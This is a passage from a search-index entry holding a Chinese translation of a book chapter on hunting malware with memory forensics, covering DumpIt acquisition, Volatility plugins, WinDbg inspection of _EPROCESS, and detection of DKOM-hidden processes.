    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9B%BD%E6%A0%87%E4%B8%AD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%9B%B8%E5%85%B3%E8%A6%81%E6%B1%82%E5%8F%8A%E7%BB%BC%E8%BF%B0/%E5%9B%BD%E6%A0%87%E4%B8%AD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%9B%B8%E5%85%B3%E8%A6%81%E6%B1%82%E5%8F%8A%E7%BB%BC%E8%BF%B0/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "安卓样本分析",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E5%AE%89%E5%8D%93%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "恶意样本分析-11-使用内存取证狩猎恶意软件 10.使用内存取证狩猎恶意软件 在到目前为止所涵盖的章节中，我们看了概念、工具和技术用于分析恶意软件使用静态，动态和代码分析。在本章中，你将理解另一种技术，称为内存取证(或内存分析)。\n内存取证(或内存分析)是一种调查性技术，涉及到从计算机的物理内存(RAM)中找到并提取司法证据。一个计算机的内存存储有关系统运行状态的有价值的信息。获取存储并进行分析将为司法提供必要的信息调查，例如系统上正在运行哪些应用程序，哪些对象(文件、注册表等)这些应用程序正在访问、活动网络连接、加载模块、加载的内核驱动程序和其他信息。由于这个原因，内存取证是用于事件响应和恶意软件分析。\n在事件响应期间，在大多数情况下，您将无法访问恶意软件样本但您可能只拥有一个可疑系统的内存映像。例如，你可以从安全产品收到关于系统可能存在恶意行为的警报，在这种情况下，您可以获取可疑系统的内存映像，以执行内存司法鉴定确认感染和找到恶意工件。\n除了将内存取证用于事件响应之外，还可以将其用作恶意软件分析(针对恶意软件样本)来获得额外的信息关于恶意软件感染后的行为。例如，当你有一个恶意软件示例中，除了执行静态、动态和代码分析之外，您还可以执行在一个孤立的环境中采样，然后获取受感染的计算机内存和检查内存图像，了解恶意软件在感染后的行为。\n使用内存取证的另一个原因是，某些恶意软件示例可能不会将恶意组件写入磁盘（仅在内存中）。因此，磁盘取证或文件系统分析可能会失败。在这种情况下，内存取证在查找恶意组件。\n一些恶意软件示例通过挂钩或修改操作系统结构。在这种情况下，内存取证可能很有用，因为它可以绕过恶意软件使用的技巧来隐藏操作系统并实时取证工具。本章向您介绍内存取证的概念并涵盖用于获取和分析内存映像的工具。\n1. 内存取证步骤 是将内存取证用作事件响应的一部分，还是用于恶意软件分析，以下是内存取证中的一般步骤：\n内存获取：这涉及获取（或转储）内存目标计算机到磁盘。取决于您是否正在调查感染者系统或使用内存取证作为恶意软件分析的一部分，目标计算机可以是您怀疑被感染的系统（在您的网络上），也可以是可能是实验室环境中执行的分析计算机恶意软件示例。 内存分析：将内存转储到磁盘后，此步骤涉及分析转储的内存以查找和提取电子证据。 2. 内存采集 存储器采集是将易失性存储器（RAM）采集到非易失性存储器的过程存储（磁盘上的文件）。有各种工具可以让您获取物理机。以下是一些允许您获取（转储）的工具物理内存到 Windows 上。其中一些工具是商业性的，其中许多注册后可以免费下载。以下工具适用于两个 x86 （32-位） 和 x64（64 位）计算机：\nComae Memory Toolkit （DumpIt） by Comae Technologies （免费下载注册）： https://my.comae.io/ Belkasoft RAM Capturer（注册后免费下载）：https://belkasoft.com/ram-capturer ACCESSData的FTK镜像软件（注册后免费下载）：https://accessdata.com/product-download Memoryze by FireEye（注册后免费下载）：https://www.fireeye.com/services/freeware/memoryze.html Volexity的浪涌收集（商业）：https://www.volexity.com/productsoverview/surge/ PassMark Software的OSForensics（商业）：https://www.osforensics.com/osforensics.html WinPmem（开源），Rekall Memory取证框架的一部分：http://blog.rekall-forensic.com/search?q=winpmem 2.1 使用转储进行内存采集 DumpIt是一款出色的内存采集工具，可让您转储物理内存在视窗上。它支持采集 32 位 （x86） 和 64 位 （x64） 计算机。Dump它是称为Comae内存工具包的工具包的一部分，该工具包由各种独立工具，有助于不同文件之间的内存采集和转换格式。要下载 Comae 内存工具包的最新副本，您需要创建一个通过在 https://my.comae.io 上注册帐户。创建帐户后，您可以登录并下载Comae内存工具包的最新副本。\n下载 Comae 工具包后，解压缩存档，然后导航到 32 位或 64 位目录，具体取决于您是要转储 32 位还是 64 位的内存机器。该目录由各种文件组成，包括 DumpIt.exe。在本节中，我们将主要关注如何使用 DumpIt 转储内存。如果您有兴趣了解目录中其他工具的功能，阅读readme.txt文件。\n使用 DumpIt 获取内存的最简单方法是右键单击 DumptIt.exe 文件，然后选择以管理员身份运行。默认情况下，DumpIt 将内存转储到文件中，如Microsoft Crash Dump（具有.dmp扩展名），然后可以使用内存进行分析分析工具，如Volatility（下面将介绍）或使用微软调试器，如 WinDbg。\n您也可以从命令行运行DumpIt;这为您提供了多种选择。要显示不同的选项，请运行 cmd.exe以管理员身份导航到目录包含 DumpIt.exe，然后键入以下命令：\nC:\\Comae-Toolkit-3.0.20180307.1\\x64\u003eDumpIt.exe /? DumpIt 3.0.20180307.1 Copyright (C) 2007 - 2017, Matthieu Suiche \u003chttp://www.msuiche.net\u003e Copyright (C) 2012 - 2014, MoonSols Limited \u003chttp://www.moonsols.com\u003e Copyright (C) 2015 - 2017, Comae Technologies FZE \u003chttp://www.comae.io\u003e Hunting Malware Using Memory Forensics Chapter 10 [ 376 ] Usage: DumpIt [Options] /OUTPUT \u003cFILENAME\u003e Description: Enables users to create a snapshot of the physical memory as a local file. Options: /TYPE, /T Select type of memory dump (e.g. RAW or DMP) [default: DMP] /OUTPUT, /O Output file to be created. (optional) /QUIET, /Q Do not ask any questions. Proceed directly. /NOLYTICS, /N Do not send any usage analytics information to Comae Technologies. This is used to improve our services. /NOJSON, /J Do not save a .json file containing metadata. Metadata are the basic information you will need for the analysis. /LIVEKD, /L Enables live kernel debugging session. /COMPRESS, /R Compresses memory dump file. /APP, /A Specifies filename or complete path of debugger image to execute. /CMDLINE, /C Specifies debugger command-line options. /DRIVERNAME, /D Specifies the name of the installed device driver image.从命令行获取 Microsoft 故障转储的内存，并保存输出到您选择的文件名，请使用 /o 或 /OUTPUT 选项，如下所示：\nC:\\Comae-Toolkit-3.0.20180307.1\\x64\u003eDumpIt.exe /o memory.dmp DumpIt 3.0.20180307.1 Copyright (C) 2007 - 2017, Matthieu Suiche \u003chttp://www.msuiche.net\u003e Copyright (C) 2012 - 2014, MoonSols Limited \u003chttp://www.moonsols.com\u003e Copyright (C) 2015 - 2017, Comae Technologies FZE \u003chttp://www.comae.io\u003e Destination path: \\??\\C:\\Comae-Toolkit-3.0.20180307.1\\x64\\memory.dmp Computer name: PC --\u003e Proceed with the acquisition ? [y/n] y [+] Information: Dump Type: Microsoft Crash Dump [+] Machine Information: Windows version: 6.1.7601 MachineId: A98B4D56-9677-C6E4-03F5-902A1D102EED TimeStamp: 131666114153429014 Cr3: 0x187000 KdDebuggerData: 0xfffff80002c460a0 Current date/time: [2018-03-27 (YYYY-MM-DD) 8:03:35 (UTC)] + Processing... Done. Acquisition finished at: [2018-03-27 (YYYY-MM-DD) 8:04:57 (UTC)] Time elapsed: 1:21 minutes:seconds (81 secs) Created file size: 8589410304 bytes (8191 Mb) Total physical memory size: 8191 Mb NtStatus (troubleshooting): 0x00000000 Total of written pages: 2097022 Total of inacessible pages: 0 Total of accessible pages: 2097022 SHA-256: 3F5753EBBA522EF88752453ACA1A7ECB4E06AEA403CD5A4034BCF037CA83C224 JSON path: C:\\Comae-Toolkit-3.0.20180307.1\\x64\\memory.json获取内存作为原始内存转储，而不是默认的 Microsoft 崩溃dump，您可以使用 /t 或 /TYPE 选项指定它，如下所示：\nC:\\Comae-Toolkit-3.0.20180307.1\\x64\u003eDumpIt.exe /t RAW DumpIt 3.0.20180307.1 Copyright (C) 2007 - 2017, Matthieu Suiche \u003chttp://www.msuiche.net\u003e Copyright (C) 2012 - 2014, MoonSols Limited \u003chttp://www.moonsols.com\u003e Copyright (C) 2015 - 2017, Comae Technologies FZE \u003chttp://www.comae.io\u003e WARNING: RAW memory snapshot files are considered obsolete and as a legacy format. Destination path: \\??\\C:\\Comae-Toolkit-3.0.20180307.1\\x64\\memory.bin Computer name: PC --\u003e Proceed with the acquisition? [y/n] y [+] Information: Dump Type: Raw Memory Dump [+] Machine Information: Windows version: 6.1.7601 MachineId: A98B4D56-9677-C6E4-03F5-902A1D102EED TimeStamp: 131666117379826680 Cr3: 0x187000 KdDebuggerData: 0xfffff80002c460a0 Current date/time: [2018-03-27 (YYYY-MM-DD) 8:08:57 (UTC)] [.......REMOVED.........]如果希望从由大内存组成的服务器获取内存，可以使用 /R或 DumpIt 中的 /COMPRESS 选项，这将创建一个 .zdmp（Comae 压缩故障转储）文件，这减小了文件大小，也使获取速度更快。转储文件 （.zdmp） 可以然后使用Comae星尘企业平台进行分析：https://my.comae.io。为更多详细信息，请参阅以下博客文章：https://blog.comae.io/rethinkinglogging-for-critical-assets-685c65423dc0。\n在大多数情况下，可以通过以下方式获取虚拟机 （VM） 的内存挂起虚拟机。例如，在 执行恶意软件样本后VMware Workstation/VMware Fusion，您可以暂停虚拟机，这会会将guest的内存 （RAM） 写入扩展名为 .vmem 的文件主机的磁盘。对于那些应用程序（如VirtualBox），其中内存无法通过挂起来获取，然后您可以使用 DumpIt在客户机器内部。\n3. Volatility浏览 获取受感染系统的内存后，下一步是分析获取的内存内存镜像。Volatility（http://www.volatilityfoundation.org/releases）是一个开放用Python编写的高级内存取证框架，允许您进行分析并从内存图像中提取电子证据。Volatility可以在各种平台上运行（Windows，macOS和Linux），它支持从32位和64位分析内存Windows、macOS 和 Linux 操作系统的版本。\n3.1 安装Volatility Volatility以多种格式分发，可以从 http://www.volatilityfoundation.org/releases 下载。在撰写本书时，最新版本Volatility为2.6版。取决于您要运行的操作系统波动开启，请按照相应操作系统的安装过程操作。\n3.1.1 Volatility独立可执行文件 开始使用 Volatility 的最快方法是使用独立的可执行文件。独立可执行文件是为Windows，macOS和Linux操作系统分发的。独立可执行文件的优点是，您不需要安装Python解释器或Polution依赖项，因为它与Python 2.7解释器和所有必需的依赖项打包在一起。\n在 Windows 上，下载独立可执行文件后，您可以通过从命令行使用 -h （–help） 选项执行独立可执行文件来检查 Volatility 是否已准备好使用，如下所示。帮助选项显示Volatility中可用的各种选项和插件：\nC:\\volatility_2.6_win64_standalone\u003evolatility_2.6_win64_standalone.exe -h Volatility Foundation Volatility Framework 2.6 Usage: Volatility - A memory forensics analysis platform. Options: -h, --help list all available options and their default values. Default values may be set in the configuration file (/etc/volatilityrc) --conf-file=.volatilityrc User based configuration file -d, --debug Debug volatility [.....REMOVED....]以同样的方式，您可以下载适用于 Linux 或 macOS 的独立可执行文件，并使用 -h（或 – help）选项执行独立可执行文件来检查 Volatility 是否已准备好使用，如下所示：\n\u003e $ ./volatility_2.6_lin64_standalone -h \u003e # ./volatility_2.6_mac64_standalone -h3.1.2 Volatility源包 Volatility也作为源包分发;您可以在Windows，macOS或Linux操作系统上运行它。Volatility依赖于各种插件来执行任务，其中一些插件依赖于第三方Python包。要运行 Volatility，您需要安装 Python 2.7 Interpreter 及其依赖项。网页：https://github.com/volatilityfoundation/volatility/wiki/Installation#recommendation-packages包含一些Volquisive插件所需的第三方Python软件包列表。可以通过阅读文档来安装这些依赖项。安装完所有依赖项后，下载 Volatility 源代码包，将其解压缩，然后运行 Volatility，如下所示：\n$ python vol.py -h Volatility Foundation Volatility Framework 2.6 Usage: Volatility - A memory forensics analysis platform. Options: -h, --help list all available options– and their default values. Default values may be set in the configuration file (/etc/volatilityrc) --conf-file=/root/.volatilityrc User based configuration file -d, --debug Debug volatility [...REMOVED...]本书中提到的所有例子都使用了vol Python脚本源包(Python vol.py)。你可以自由选择一个独立的可执行文件，但要记住将python vol.py替换为独立的可执行文件名称。 #### 3.2 使用Volatility Volatility由各种插件组成，它可以从内存映像中提取不同的信息。 python vol.py -h 选项显示支持的插件。例如，如果你想要列出内存映像中正在运行的进程，你可以使用pslist这样的插件，或者如果你想要列出网络连接，你可以使用不同的插件。不管您使用的插件是什么，您都将使用以下命令语法。使用-f，您可以指定内存映像文件的路径，而——profile告诉volatile内存映像是从哪个系统和体系结构获得的。插件可以根据你想从内存映像中提取的信息类型而变化:\u000c$ python vol.py -f \u003cmemory image file\u003e --profile=\u003cPROFILE\u003e \u003cPLUGIN\u003e [ARGS]下面的命令使用pslist插件列出列表中正在运行的进程 从运行Service Pack 1的Windows 7(32位)获取的内存映像:\n$ python vol.py -f mem_image.raw --profile=Win7SP1x86 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start ---------- ---------- ---- ---- ---- ---- ---- ----- --------------------- 0x84f4a958 System 4 0 86 448 ---- 0 2016-08-13 05:54:20 0x864284e0 smss.exe 272 4 2 29 ---- 0 2016-08-13 05:54:20 0x86266030 csrss.exe 356 340 9 504 0 0 2016-08-13 05:54:22 0x86e0a1a0 wininit.exe 396 340 3 75 0 0 2016-08-13 05:54:22 0x86260bd0 csrss.exe 404 388 10 213 1 0 2016-08-13 05:54:22 0x86e78030 winlogon.exe 460 388 3 108 1 0 2016-08-13 05:54:22 [....REMOVED....]有时候，您可能不知道向Volatility提供什么配置文件。在这种情况下，你可以使用imageinfo插件，它将决定正确的配置文件。下面的命令显示多个由imageinfo插件建议的配置文件;你可以使用任何建议的配置文件:\n$ python vol.py -f mem_image.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s): Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (Users/Test/Desktop/mem_image.raw) PAE type : PAE DTB : 0x185000L KDBG : 0x82974be8L Number of Processors : 1 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0x82975c00L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2016-08-13 06:00:43 UTC+0000 Image local date and time : 2016-08-13 11:30:43 +0530 大多数的Volatility插件，比如pslist，依赖于从Windows操作系统结构中提取信息。这些结构在不同版本的Windows中有所不同;配置文件(——profile)告诉volatile使用哪些数据结构、符号和算法。\n帮助选项，-h(——help)，您之前看到的，显示了应用于所有Volatility插件的帮助。您可以使用相同的-h(——help)选项来确定插件支持的各种选项和参数。为此，只需在插件名称旁边输入-h(——help)。下面的命令显示pslist插件的帮助选项:\n$ python vol.py -f mem_image.raw --profile=Win7SP1x86 pslist -h在这一点上，你应该了解如何在获取的内存映像上运行Volatility插件，以及如何确定插件支持的各种选项。在下面的部分中，您将了解不同的插件，以及如何使用它们从内存映像中提取电子证据。\n4. 列举进程 在研究内存映像时，您将主要关注识别系统上运行的任何可疑进程。在Volatility中有各种各样的插件可以让你枚举进程。Volatility的pslist插件从内存映像中列出进程，类似于任务管理器在活动系统中列出进程的方式。在下面的输出中，运行pslist插件对一个被恶意软件样本(Perseus)感染的内存映像显示两个可疑进程:svchost.exe (pid 3832)和suchost.exe (pid 3924)。这两个进程可疑的原因是，这些进程的名称在.exe扩展名之前有一个额外的点字符(这是不正常的)。在干净的系统上，您会发现svchost.exe进程的多个实例正在运行。通过创建一个进程，例如svchost.exe和suchost. exe，攻击者试图通过使这些进程看起来类似于合法的svchost.exe进程来混入:\n$ python vol.py -f perseus.vmem --profile=Win7SP1x86 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start ---------- ----------- ---- ----- ---- ---- ---- ----- ------------------- 0x84f4a8e8 System 4 0 88 475 ---- 0 2016-09-23 09:21:47 0x8637b020 smss.exe 272 4 2 29 ---- 0 2016-09-23 09:21:47 0x86c19310 csrss.exe 356 340 8 637 0 0 2016-09-23 09:21:49 0x86c13458 wininit.exe 396 340 3 75 0 0 2016-09-23 09:21:49 0x86e84a08 csrss.exe 404 388 9 191 1 0 2016-09-23 09:21:49 0x87684030 winlogon.exe 452 388 4 108 1 0 2016-09-23 09:21:49 0x86284228 services.exe 496 396 11 242 0 0 2016-09-23 09:21:49 0x876ab030 lsass.exe 504 396 9 737 0 0 2016-09-23 09:21:49 0x876d1a70 svchost.exe 620 496 12 353 0 0 2016-09-23 09:21:49 0x864d36a8 svchost.exe 708 496 6 302 0 0 2016-09-23 09:21:50 0x86b777c8 svchost.exe 760 496 24 570 0 0 2016-09-23 09:21:50 0x8772a030 svchost.exe 852 496 28 513 0 0 2016-09-23 09:21:50 0x87741030 svchost.exe 920 496 46 1054 0 0 2016-09-23 09:21:50 0x877ce3c0 spoolsv.exe 1272 496 15 338 0 0 2016-09-23 09:21:50 0x95a06a58 svchost.exe 1304 496 19 306 0 0 2016-09-23 09:21:50 0x8503f0e8 svchost..exe 3832 3712 11 303 0 0 2016-09-23 09:24:55 0x8508bb20 suchost..exe 3924 3832 11 252 0 0 2016-09-23 09:24:55 0x861d1030 svchost.exe 3120 496 12 311 0 0 2016-09-23 09:25:39 [......REMOVED..............]运行Volatility插件很容易;你可以在不知道它如何工作的情况下运行插件。了解插件的工作方式将帮助您评估结果的准确性，还将帮助您在攻击者使用隐形技术时选择正确的插件。问题是，pslist是如何工作的?要理解这一点，首先需要理解什么是进程以及Windows内核如何跟踪进程。\n4.1 过程概述 进程是一个对象。Windows操作系统是基于对象的(不要与面向对象语言中使用的术语对象混淆)。对象指的是系统资源，比如进程、文件、设备、目录、互斥体等等，它们由内核中的一个称为对象管理器的组件管理。要了解Windows上的所有对象类型，可以使用WinObj工具(https://docs.microsoft.com/en-us/sysinternals/downloads/WinObj)。要查看WinObj中的对象类型，请以管理员身份启动WinObj，并在左侧窗格中单击ObjectTypes，这将显示所有的Windows对象。\n对象(如进程、文件、线程等)在c中表示为结构。这意味着进程对象有一个与之相关联的结构，这个结构称为_EPROCESS结构。_EPROCESS结构体驻留在内核内存中，Windows内核使用EPROCESS结构体在内部表示一个进程。_EPROCESS结构包含与进程相关的各种信息，如进程名、进程ID、父进程ID、与进程关联的线程数、进程创建时间等。现在，回到pslist输出，并注意特定进程显示的信息类型。例如，如果您查看来自pslist输出的第二个条目，它显示了sms.exe进程的名称、其进程ID(272)、父进程ID(4)等等。您可能已经猜到了，与进程相关的信息来自它的_EPROCESS结构体。\n4.1.1 检查_EPROCESS结构 要检查_EPROCESS结构及其包含的信息类型，可以使用内核调试器，如WinDbg。WinDbg有助于探索和理解操作系统数据结构，这通常是内存取证的一个重要方面。要安装WinDbg，你需要安装“Windows调试工具”包，它是微软SDK的一部分(不同的安装类型请参考https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/index)。一旦安装完成，您可以在安装目录中找到WinDbg.exe(在我的例子中，它位于C:\\Program Files (x86)\\Windows Kits\\8.1\\Debuggers\\x64)。接下来，从Sysinternals (https://docs.microsoft.com/en-us/sysinternals/downloads/ LiveKD)下载LiveKD实用程序，解压，然后将LiveKD.exe复制到WinDbg的安装目录。LiveKD使您能够在活动的系统上执行本地内核调试。要通过livekd启动WinDbg，打开命令提示符(以管理员身份)，导航到WinDbg安装目录，并使用-w开关运行livekd，如下所示。你也可以将Windbg安装目录添加到path环境变量中，这样你就可以从任何路径启动LiveKD:\nC:\\Program Files (x86)\\Windows Kits\\8.1\\Debuggers\\x64\u003elivekd -wlivekd -w命令自动启动Windbg，加载符号，并向您显示准备接受命令的kd\u003e提示符，如下面的截图所示。要探索数据结构(例如_EPROCESS)，您将在命令提示符(kd\u003e旁边)中输入适当的命令:\n现在，回到我们对_EPROCESS结构的讨论，为了探索_EPROCESS结构，我们将使用Display Type命令(dt)。dt命令可用于研究表示变量、结构或联合的符号。在下面的输出中，使用dt命令显示nt模块(内核执行者的名称)中定义的_EPROCESS结构。EPROCESS结构由多个字段组成，存储进程的各种元数据。这是64位Windows 7系统的样子(一些字段已经被删除，以保持它小):\nkd\u003e dt nt!_EPROCESS +0x000 Pcb : _KPROCESS +0x160 ProcessLock : _EX_PUSH_LOCK +0x168 CreateTime : _LARGE_INTEGER +0x170 ExitTime : _LARGE_INTEGER +0x178 RundownProtect : _EX_RUNDOWN_REF +0x180 UniqueProcessId : Ptr64 Void +0x188 ActiveProcessLinks : _LIST_ENTRY +0x198 ProcessQuotaUsage : [2] Uint8B +0x1a8 ProcessQuotaPeak : [2] Uint8B [REMOVED] +0x200 ObjectTable : Ptr64 _HANDLE_TABLE +0x208 Token : _EX_FAST_REF +0x210 WorkingSetPage : Uint8B +0x218 AddressCreationLock : _EX_PUSH_LOCK [REMOVED] +0x290 InheritedFromUniqueProcessId : Ptr64 Void +0x298 LdtInformation : Ptr64 Void +0x2a0 Spare : Ptr64 Void [REMOVED] +0x2d8 Session : Ptr64 Void +0x2e0 ImageFileName : [15] UChar +0x2ef PriorityClass : UChar [REMOVED]下面是我们将在讨论中使用的_EPROCESS结构中一些有趣的字段:\nCreateTime:指示进程第一次启动的时间戳 ExitTime:进程退出的时间戳 UniqueProcessID:整数，引用进程的进程ID (PID) ActiveProcessLinks:一个双链表，链接系统上运行的所有活动进程 InheritedFromUniqueProcessId:指定父进程PID的整数 ImageFileName:一个由16个ASCII字符组成的数组，用于存储可执行进程的名称 在理解了如何检查_EPROCESS结构之后，现在让我们看一看特定进程的_EPROCESS结构。要做到这一点，让我们首先列出所有使用WinDbg的活动进程。可以使用!process extension命令打印特定进程或所有进程的元数据。在下面的命令中，第一个参数0列出了所有进程的元数据。您还可以通过指定_EPROCESS结构体的地址来显示单个进程的信息。第二个参数表示细节级别:\nkd\u003e !process 0 0 **** NT ACTIVE PROCESS DUMP **** PROCESS fffffa806106cb30 SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000 DirBase: 00187000 ObjectTable: fffff8a0000016d0 HandleCount: 539. Image: System PROCESS fffffa8061d35700 SessionId: none Cid: 00fc Peb: 7fffffdb000 ParentCid: 0004 DirBase: 1faf16000 ObjectTable: fffff8a0002d26b0 HandleCount: 29. Image: smss.exe PROCESS fffffa8062583b30 SessionId: 0 Cid: 014c Peb: 7fffffdf000 ParentCid: 0144 DirBase: 1efb70000 ObjectTable: fffff8a00af33ef0 HandleCount: 453. Image: csrss.exe [REMOVED] 关于WinDbg命令的详细信息，请参考Debugger.chm寻找帮助，位于WinDbg安装目录下。您也可以参考以下在线资源:http://windbg.info/doc/1-common-cmds.html和http://windbg.info/doc/2-windbg-a-z.html\n在前面的输出中，让我们看看第二个条目，它描述了sms.exe。PROCESS旁边的地址fffffa8061d35700是与sms.exe实例相关联的_EPROCESS结构体的地址。Cid为进程ID，取值为00fc(十进制为252);ParentCid为父进程的进程ID，取值为0004。您可以通过检查sms.exe的_EPROCESS结构的字段值来验证这一点。的地址可以加后缀 显示类型(dt)命令末尾的_EPROCESS结构，如下面的命令所示。在下面的输出中，注意字段UniqueProcessId(进程ID)、InheritedFromUniqueProcessId(父进程ID)和ImageFileName(进程可执行名称)中的值。这些值与您之前从!process 0 0命令中确定的结果匹配:\nkd\u003e dt nt!_EPROCESS fffffa8061d35700 +0x000 Pcb : _KPROCESS +0x160 ProcessLock : _EX_PUSH_LOCK +0x168 CreateTime : _LARGE_INTEGER 0x01d32dde`223f3e88 +0x170 ExitTime : _LARGE_INTEGER 0x0 +0x178 RundownProtect : _EX_RUNDOWN_REF +0x180 UniqueProcessId : 0x00000000`000000fc Void +0x188 ActiveProcessLinks : _LIST_ENTRY [ 0xfffffa80`62583cb8 - 0xfffffa80`6106ccb8 ] +0x198 ProcessQuotaUsage : [2] 0x658 [REMOVED] +0x290 InheritedFromUniqueProcessId : 0x00000000`00000004 Void +0x298 LdtInformation : (null) [REMOVED] +0x2d8 Session : (null) +0x2e0 ImageFileName : [15] \"smss.exe\" +0x2ef PriorityClass : 0x2 '' [REMOVED]到目前为止，我们知道操作系统将关于进程的各种元数据信息保存在_EPROCESS结构中，该结构驻留在内核内存中。这意味着如果您可以找到一个特定进程的_EPROCESS结构体的地址，您就可以获得关于该进程的所有信息。那么，问题是，如何获取关于系统上运行的所有进程的信息?为此，我们需要了解Windows操作系统是如何跟踪活动进程的。\n4.1.2 理解ActiveProcessLinks Windows使用_EPROCESS结构的循环双链表来跟踪所有的活动进程。_EPROCESS结构包含一个名为ActiveProcessLinks的字段，它的类型是LIST_ENTRY。_LIST_ENTRY是另一个包含两个成员的结构，如下面的命令输出所示。Flink(前向链接)指向下一个_EPROCESS结构的_LIST_ENTRY, Blink(后向链接)指向前一个_EPROCESS结构的_LIST_ENTRY:\nkd\u003e dt nt!_LIST_ENTRY +0x000 Flink : Ptr64 _LIST_ENTRY +0x008 Blink : Ptr64 _LIST_ENTRYFlink和Blink一起创建一个进程对象链;可以将其可视化如下:\n需要注意的一点是，Flink和Blink并不指向_EPROCESS结构体的开始。Flink指向下一个_EPROCESS结构的_LIST_ENTRY结构的开始(第一个字节)，Blink指向前一个_EPROCESS结构的_LIST_ENTRY结构的第一个字节。这很重要的原因是,一旦你找到的_EPROCESS结构过程中,你可以向前走双向链表(使用Flink)或向后(Blink),然后减去偏移值到达_EPROCESS结构下的开始或之前的流程。为了帮助你理解这意味着什么，让我们看看sms.exe的_EPROCESS结构中的字段Flink和Blink的值:\nkd\u003e dt -b -v nt!_EPROCESS fffffa8061d35700 struct _EPROCESS, 135 elements, 0x4d0 bytes ..... +0x180 UniqueProcessId : 0x00000000`000000fc +0x188 ActiveProcessLinks : struct _LIST_ENTRY, 2 elements, 0x10 bytes [ 0xfffffa80`62583cb8 - 0xfffffa80`6106ccb8 ] +0x000 Flink : 0xfffffa80`62583cb8 +0x008 Blink : 0xfffffa80`6106ccb8Flink的值是0xfffffa8062583cb8;这是下一个_EPROCESS结构的ActiveProcessLinks (Flink)的起始地址。在我们的示例中，由于ActiveProcessLinks位于_EPROCESS开始处0x188的偏移量，所以通过从Flink值减去0x188，您可以到达下一个进程的_EPROCESS结构的开始处。在下面的输出中，注意如何通过减去0x188我们降落在下一个进程的_EPROCESS结构上，这是csss.exe:\nkd\u003e dt nt!_EPROCESS (0xfffffa8062583cb8-0x188) +0x000 Pcb : _KPROCESS +0x160 ProcessLock : _EX_PUSH_LOCK [REMOVED] +0x180 UniqueProcessId : 0x00000000`0000014c Void +0x188 ActiveProcessLinks : _LIST_ENTRY [ 0xfffffa80`625acb68 - 0xfffffa80`61d35888 ] +0x198 ProcessQuotaUsage : [2] 0x2c18 [REMOVED] +0x288 Win32WindowStation : (null) +0x290 InheritedFromUniqueProcessId : 0x00000000`00000144 Void [REMOVED] +0x2d8 Session : 0xfffff880`042ae000 Void +0x2e0 ImageFileName : [15] \"csrss.exe\" +0x2ef PriorityClass : 0x2 ''正如您所看到的，通过遍历这个双向链表，可以列出系统上运行的所有活动进程的信息。在活动的系统中，任务管理器或进程资源管理器等工具使用API函数，这些函数最终依赖于查找和遍历存在于内核内存中的相同的_EPROCESS结构的双链接列表。pslist插件还包含了从内存映像中查找和遍历相同的_EPROCESS结构的双链表的逻辑。为此，pslist插件会找到一个名为_PsActiveProcessHead的符号，它定义在ntoskrnl.exe(或ntkrnlpa.exe)中。这个符号指向_EPROCESS结构的双链表的开始;然后pslist遍历_EPROCESS结构的双链接列表，以枚举所有正在运行的进程。\n关于本书中涉及到的Volatility插件的工作原理和逻辑的详细信息，请参考Michael Hale light、Andrew Case、Jamie Levy和Aaron Walters的《内存取证的艺术:在Windows、Linux和Mac内存中检测恶意软件和威胁》。\n如前所述，像pslist这样的插件支持多个选项和参数;这可以通过在插件名称旁边输入-h(——help)来显示。pslist选项之一是——output-file。你可以使用这个选项来重定向pslist输出到文件，如下所示:\n$ python vol.py -f perseus.vmem --profile=Win7SP1x86 pslist --output- file=pslist.txt另一个选项是-p(——pid)。使用这个选项，如果你知道一个进程的进程ID (PID)，你可以确定它的信息:\n$ python vol.py -f perseus.vmem --profile=Win7SP1x86 pslist -p 3832 Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Wow64 Start ---------- ------------ ---- ---- ---- ---- ----- ------------------- 0x8503f0e8 svchost..exe 3832 3712 11 303 0 2016-09-23 09:24:554.2 使用psscan列出进程 psscan是Volatility的另一个插件，它列出了系统上运行的进程。与pslist不同，psscan不会遍历_EPROCESS对象的双链接列表。相反，它扫描物理内存，寻找进程对象的签名。换句话说，与pslist插件相比，psscan使用了不同的方法来列出进程。你可能会想，当psscan插件可以做同样的事情时，psscan插件有什么用?答案在于psscan使用的技术。由于它使用的方法，它可以检测终止的进程和隐藏的进程。攻击者可以隐藏进程，以防止司法分析人员在实时司法过程中发现恶意进程。现在的问题是，攻击者如何隐藏进程?要理解这一点，您需要了解一种称为DKOM(直接内核对象操作)的攻击技术。\n4.2.1 直接内核对象操作(DKOM) DKOM是一种涉及修改内核数据结构的技术。使用DKOM，可以隐藏进程或驱动程序。为了隐藏进程，攻击者可以找到他/她想要隐藏的恶意进程的_EPROCESS结构，并修改ActiveProcessLinks字段。特别是，前一个_EPROCESS块的Flink被设置为指向下一个_EPROCESS块的Flink，而下一个_EPROCESS块的Blink被设置为指向前一个_EPROCESS块的Flink。结果，与恶意程序进程相关的_EPROCESS块从双向链接列表中被解除链接(如下所示): 通过解除进程的链接，攻击者可以对活动的取证工具隐藏恶意进程，这些取证工具依赖于遍历双链接列表来枚举活动进程。正如您可能已经猜到的，这种技术还隐藏了pslist插件的恶意进程(它也依赖于遍历双链接列表)。以下是感染了prolaco rootkit的系统的pslist和psscan输出，该系统执行DKOM来隐藏进程。为了简单起见，下面的输出中删除了一些条目。当你比较pslist和psscan的输出时，你会注意到psscan输出中有一个额外的进程，名为nvid.exe 